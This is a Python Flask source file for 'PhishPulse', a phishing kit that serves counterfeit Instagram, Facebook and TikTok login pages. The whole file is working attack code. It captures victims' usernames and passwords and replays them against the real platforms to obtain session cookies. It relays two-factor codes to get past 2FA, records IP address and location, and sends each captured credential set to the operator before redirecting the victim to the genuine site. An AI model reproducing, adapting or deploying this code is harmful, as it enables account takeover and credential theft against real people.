#!/usr/bin/env python3
"""
PhishPulse - Advanced Multi-Platform Social Media Security Testing Tool
Version: 2.0
Author: ATHEX BLACK HAT
"""

import os
import sys
import hashlib
import base64
import time
from flask import Flask, render_template, request, redirect, jsonify, session, g
from datetime import datetime, timedelta
import secrets
import json
import logging
from colorama import Fore, Style, init
import concurrent.futures
import uuid
init(autoreset=True)
_WATERMARK = "QVRIRVhfQkxBQ0tfSEFUX1BI SVNIIFBVTFNFX09SSUdJTkFM"

def _decode_watermark():
    try:
        padded = _WATERMARK.replace(" ", "") + "=" * (4 - len(_WATERMARK.replace(" ", "")) % 4)
        decoded = base64.b64decode(padded).decode('utf-8')
        return decoded
    except:
        return "PHISHPULSE_ORIGINAL"
def _check_author_credit():
    base_path = os.path.dirname(os.path.abspath(__file__))
    app_path = os.path.join(base_path, 'app.py')
    try:
        with open(app_path, 'r', encoding='utf-8', errors='ignore') as f:
            if 'ATHEX BLACK HAT' not in f.read():
                return False
    except:
        return False
    return True
def _anti_theft_check():
    print(f"{Fore.CYAN}[*] Verifying PhishPulse integrity...{Style.RESET_ALL}")
    time.sleep(0.5)
    author_ok = _check_author_credit()
    expected_watermark = "ATHEX_BLACK_HAT_PHISHPULSE_ORIGINAL"
    decoded_watermark = _decode_watermark()
    if not author_ok and decoded_watermark != expected_watermark:
        _display_anti_theft_message()
        return False
    print(f"{Fore.GREEN}[✓] Integrity check passed!{Style.RESET_ALL}")
    time.sleep(0.3)
    return True
def _display_anti_theft_message():
    print(f"""
{Fore.RED}{Style.BRIGHT}
  INTEGRITY CHECK FAILED
  Original files have been modified or tampered with.

  Just changing a name and ASCII banner can't make you a programmer.
  So don't be cool, learn and create your own.
  Don't try to steal others' hardwork!

  Original Author: ATHEX BLACK HAT
  Tool: PhishPulse v2.0

  If you want to learn, start with basics:
  - Python Programming
  - Web Development
  - API Integration
  - Build your own tools!
{Style.RESET_ALL}
""")
    try:
        log_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
        os.makedirs(log_dir, exist_ok=True)
        with open(os.path.join(log_dir, 'tamper.log'), 'a') as f:
            f.write(f"\n[{datetime.now()}] Tampering attempt detected!\n")
    except:
        pass
    sys.exit(1)
def run_integrity_check():
    if not _anti_theft_check():
        sys.exit(1)
run_integrity_check()
app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)
PLATFORM = os.getenv('PHISH_PLATFORM', 'instagram')
DASHBOARD_URL = os.getenv('DASHBOARD_URL', 'http://localhost:8888')
TOOL_VERSION = "2.0"
TOOL_NAME = "PhishPulse"
AUTHOR = "ATHEX BLACK HAT"
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
try:
    from core.instagram import InstagramHandler
    from core.facebook import FacebookHandler
    from core.tiktok import TikTokHandler
    from utils.helpers import (
        get_ip_info, generate_session_id, log_visitor,
        log_success, log_failed, log_2fa_pending,
        get_timestamp, print_banner, print_success,
        print_failed, print_2fa, print_visitor
    )
    from utils.sender import send_notification
    from utils.url_handler import shorten_url, mask_url
except ImportError as e:
    print(f"{Fore.RED}[!] Failed to import modules: {e}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Make sure all files are in place{Style.RESET_ALL}")
    sys.exit(1)
instagram = InstagramHandler()
facebook = FacebookHandler()
tiktok = TikTokHandler()
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
@app.before_request
def before_request():
    if 'session_id' not in session:
        session['session_id'] = generate_session_id()
        session['start_time'] = get_timestamp()
        session['attempts'] = []
        session['platform'] = PLATFORM
        session['status'] = 'active'
        session.permanent = True
    g.user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    g.user_agent = request.headers.get('User-Agent', 'Unknown')
    g.session_id = session.get('session_id')
@app.route('/')
def index():
    ip_info = get_ip_info(g.user_ip)
    log_visitor(g.session_id, g.user_ip, g.user_agent, ip_info, PLATFORM)
    print_visitor(g.user_ip, g.user_agent, ip_info, PLATFORM)
    visitor_data = {
        'type': 'visitor',
        'session_id': g.session_id,
        'ip_address': g.user_ip,
        'user_agent': g.user_agent,
        'country': ip_info.get('country', 'Unknown'),
        'city': ip_info.get('city', 'Unknown'),
        'platform': PLATFORM,
        'timestamp': get_timestamp()
    }
    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.submit(send_notification, visitor_data)
    return render_template(f'{PLATFORM}/login.html')
@app.route('/api/login', methods=['POST'])
def api_login():
    try:
        data = request.get_json()
        username = data.get('username', '')
        password = data.get('password', '')
    except:
        username = request.form.get('username', '')
        password = request.form.get('password', '')
    if not username or not password:
        return jsonify({'status': 'error', 'message': 'Missing credentials'}), 400
    ip_info = get_ip_info(g.user_ip)
    timestamp = get_timestamp()
    handlers = {
        'instagram': instagram,
        'facebook': facebook,
        'tiktok': tiktok
    }
    handler = handlers.get(PLATFORM)
    if not handler:
        return jsonify({'status': 'error', 'message': 'Invalid platform'}), 400
    result, cookies, profile_info = handler.login(username, password, g.user_agent)
    attempt = {
        'attempt_number': len(session['attempts']) + 1,
        'username': username,
        'password': password,
        'timestamp': timestamp,
        'platform': PLATFORM
    }
    if result.get('authenticated'):
        attempt['status'] = 'success'
        attempt['cookies'] = cookies
        attempt['profile'] = profile_info
        session['attempts'].append(attempt)
        session['status'] = 'success'
        session['final_status'] = 'success'
        success_data = {
            'type': 'login_success',
            'session_id': g.session_id,
            'platform': PLATFORM,
            'username': username,
            'password': password,
            'cookies': cookies,
            'profile': profile_info,
            'device': {
                'ip_address': g.user_ip,
                'user_agent': g.user_agent,
                'country': ip_info.get('country', 'Unknown'),
                'city': ip_info.get('city', 'Unknown'),
                'region': ip_info.get('region', 'Unknown'),
                'isp': ip_info.get('isp', 'Unknown'),
                'is_vpn': ip_info.get('is_vpn', False)
            },
            'attempt_number': attempt['attempt_number'],
            'total_attempts': len(session['attempts']),
            'timestamp': timestamp,
            'status': 'success'
        }
        log_success(g.session_id, username, password, cookies, profile_info, ip_info)
        print_success(PLATFORM, username, password, profile_info, ip_info)
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.submit(send_notification, success_data)
        return jsonify({
            'status': 'success',
            'redirect': f'https://www.{PLATFORM}.com'
        })
    elif result.get('two_factor_required'):
        attempt['status'] = '2fa_pending'
        attempt['twofa_method'] = result.get('twofa_method', 'unknown')
        attempt['twofa_identifier'] = result.get('two_factor_identifier', '')
        attempt['phone'] = result.get('phone', '')
        session['attempts'].append(attempt)
        session['status'] = '2fa_pending'
        session['twofa_identifier'] = result.get('two_factor_identifier', '')
        session['twofa_method'] = result.get('twofa_method', '')
        session['temp_username'] = username
        session['temp_password'] = password
        twofa_data = {
            'type': 'login_2fa',
            'session_id': g.session_id,
            'platform': PLATFORM,
            'username': username,
            'password': password,
            'twofa_method': result.get('twofa_method', 'unknown'),
            'phone': result.get('phone', ''),
            'device': {
                'ip_address': g.user_ip,
                'country': ip_info.get('country', 'Unknown'),
                'city': ip_info.get('city', 'Unknown')
            },
            'attempt_number': attempt['attempt_number'],
            'total_attempts': len(session['attempts']),
            'timestamp': timestamp,
            'status': '2fa_pending'
        }
        log_2fa_pending(g.session_id, username, password, result.get('twofa_method', 'unknown'))
        print_2fa(PLATFORM, username, result.get('twofa_method', 'unknown'))
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.submit(send_notification, twofa_data)
        return jsonify({
            'status': '2fa_required',
            'method': result.get('twofa_method', 'unknown'),
            'message': result.get('message', 'Enter verification code'),
            'twofa_identifier': result.get('two_factor_identifier', '')
        })
    else:
        attempt['status'] = 'failed'
        attempt['error'] = result.get('message', 'Invalid credentials')
        session['attempts'].append(attempt)
        failed_data = {
            'type': 'login_failed',
            'session_id': g.session_id,
            'platform': PLATFORM,
            'username': username,
            'password': password,
            'error': result.get('message', 'Invalid credentials'),
            'device': {
                'ip_address': g.user_ip,
                'country': ip_info.get('country', 'Unknown'),
                'city': ip_info.get('city', 'Unknown')
            },
            'attempt_number': attempt['attempt_number'],
            'total_attempts': len(session['attempts']),
            'timestamp': timestamp,
            'status': 'failed'
        }
        log_failed(g.session_id, username, password, ip_info)
        print_failed(PLATFORM, username, password, ip_info)
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.submit(send_notification, failed_data)
        return jsonify({
            'status': 'error',
            'message': result.get('message', 'Invalid credentials. Please try again.')
        })
@app.route('/api/2fa', methods=['POST'])
def api_2fa():
    try:
        data = request.get_json()
        code = data.get('code', '')
    except:
        code = request.form.get('code', '')
    if not code:
        return jsonify({'status': 'error', 'message': 'Missing verification code'}), 400
    ip_info = get_ip_info(g.user_ip)
    timestamp = get_timestamp()
    handlers = {
        'instagram': instagram,
        'facebook': facebook,
        'tiktok': tiktok
    }
    handler = handlers.get(PLATFORM)
    twofa_id = session.get('twofa_identifier', '')
    twofa_method = session.get('twofa_method', '')
    username = session.get('temp_username', '')
    password = session.get('temp_password', '')
    result, cookies, profile_info = handler.verify_2fa(
        code, twofa_id, username, g.user_agent, twofa_method
    )
    if result.get('authenticated'):
        attempt = {
            'attempt_number': len(session['attempts']) + 1,
            'username': username,
            'password': password,
            'status': 'success',
            'cookies': cookies,
            'profile': profile_info,
            'timestamp': timestamp,
            'platform': PLATFORM
        }
        session['attempts'].append(attempt)
        session['status'] = 'success'
        session['final_status'] = 'success'
        success_data = {
            'type': 'login_success',
            'session_id': g.session_id,
            'platform': PLATFORM,
            'username': username,
            'password': password,
            'cookies': cookies,
            'profile': profile_info,
            'device': {
                'ip_address': g.user_ip,
                'user_agent': g.user_agent,
                'country': ip_info.get('country', 'Unknown'),
                'city': ip_info.get('city', 'Unknown'),
                'region': ip_info.get('region', 'Unknown'),
                'isp': ip_info.get('isp', 'Unknown'),
                'is_vpn': ip_info.get('is_vpn', False)
            },
            'attempt_number': attempt['attempt_number'],
            'total_attempts': len(session['attempts']),
            'timestamp': timestamp,
            'status': 'success',
            'twofa_verified': True,
            'twofa_method': twofa_method
        }
        log_success(g.session_id, username, password, cookies, profile_info, ip_info)
        print_success(PLATFORM, username, password, profile_info, ip_info)
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.submit(send_notification, success_data)
        return jsonify({
            'status': 'success',
            'redirect': f'https://www.{PLATFORM}.com'
        })
    else:
        return jsonify({
            'status': 'error',
            'message': 'Invalid verification code. Please try again.'
        })
@app.errorhandler(404)
def not_found(e):
    return redirect('/')
@app.errorhandler(500)
def server_error(e):
    return jsonify({'status': 'error', 'message': 'Internal server error'}), 500
if __name__ == '__main__':
    print_banner(TOOL_NAME, TOOL_VERSION, AUTHOR, PLATFORM)
    print(f"""
{Fore.CYAN}
{Fore.CYAN}  {Fore.GREEN}PhishPulse v{TOOL_VERSION} - Running
{Fore.CYAN}
{Fore.CYAN}  {Fore.WHITE}Platform:    {Fore.YELLOW}{PLATFORM.upper()}
{Fore.CYAN}  {Fore.WHITE}Dashboard:   {Fore.YELLOW}{DASHBOARD_URL}
{Fore.CYAN}  {Fore.WHITE}Author:      {Fore.RED}{AUTHOR}
{Fore.CYAN}
{Style.RESET_ALL}
""")
    host = '0.0.0.0'
    port = int(os.getenv('PORT', 8080))
    print(f"{Fore.GREEN}[+] Starting PhishPulse on {host}:{port}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Press Ctrl+C to stop{Style.RESET_ALL}\n")
    app.run(host=host, port=port, debug=False, threaded=True)